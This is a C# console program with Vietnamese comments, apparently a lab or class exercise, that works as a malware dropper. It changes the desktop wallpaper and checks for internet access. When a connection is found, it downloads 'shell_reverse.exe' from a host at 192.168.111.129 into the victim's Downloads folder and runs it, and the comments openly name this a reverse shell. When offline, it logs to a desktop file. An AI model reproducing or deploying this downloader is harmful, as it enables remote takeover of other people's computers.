using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Net.NetworkInformation;
using System.Net;
using System.Diagnostics;



namespace Bai_3
{
    class Program
    {
        private static Guid FolderDownloads = new Guid("374DE290-123F-4565-9164-39C4925E467B");
        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(UAction uAction, int uParam, StringBuilder lpvParam, int fuWinIni);

        public static string GetDownloadsPath()
        {
            if (Environment.OSVersion.Version.Major < 6) throw new NotSupportedException();

            IntPtr pathPtr = IntPtr.Zero;

            try
            {
                SHGetKnownFolderPath(ref FolderDownloads, 0, IntPtr.Zero, out pathPtr);
                return Marshal.PtrToStringUni(pathPtr);
            }
            finally
            {
                Marshal.FreeCoTaskMem(pathPtr);
            }
        }
        static void Main(string[] args)
        {
            Program p = new Program();
            try
            {
                SetBackground(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
                p.CheckConnection();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }

        public enum UAction
        {
            SPI_SETDESKWALLPAPER = 0x0014,                              //set hình nền cho desktop 
        }

        public static int SetBackground(string fileName)               //đổi hình nền máy tính thành file được chỉ định, ở đây là hình windows mặc định.
        {
            int result = 0;
            if (File.Exists(fileName))
            {
                StringBuilder s = new StringBuilder(fileName);
                result = SystemParametersInfo(UAction.SPI_SETDESKWALLPAPER, 0, s, 0x2);
            }
            return result;
        }

        
        
        public void WriteToFile(string Message)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\Lmeow.txt";     //tạo file txt trên desktop nếu không có kết nối internet 
            if (!File.Exists(filepath)) 
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        public void CheckConnection()
        {   
            string host = "www.google.com";                                 //link url kiểm tra kết nối
            Ping ping = new Ping();                                         //tạo kết nối ping
            try
            {
                PingReply reply = ping.Send(host, 3000);                    //thử ping đến host (timeout=3000)
                if (reply.Status == IPStatus.Success)                       //Nếu ping thành công
                {
                    try
                    {
                        string downpath= GetDownloadsPath();                //Tìm thư mục download của máy nạn nhân
                        string remoteUri = "http://192.168.111.129/shell_reverse.exe"; //URL tải reverse shell
                        string fileName = downpath + @"\shell_reverse.exe";
                        
                        using (WebClient myWebClient = new WebClient())     
                        {
                            myWebClient.DownloadFile(remoteUri, fileName);  //download file reverse shell vào thư mục download đã xác định ở trên
                        }
                        Process.Start(fileName);             //start reverse shell
                    }
                    catch
                    {
                        Console.WriteLine("Cannot connect to server");
                    }
                }
            }
            catch
            {
                WriteToFile("No internet connection at " + DateTime.Now);   //nếu không có kết nối thì tạo file với nội dung 
            }
        }
    }
}
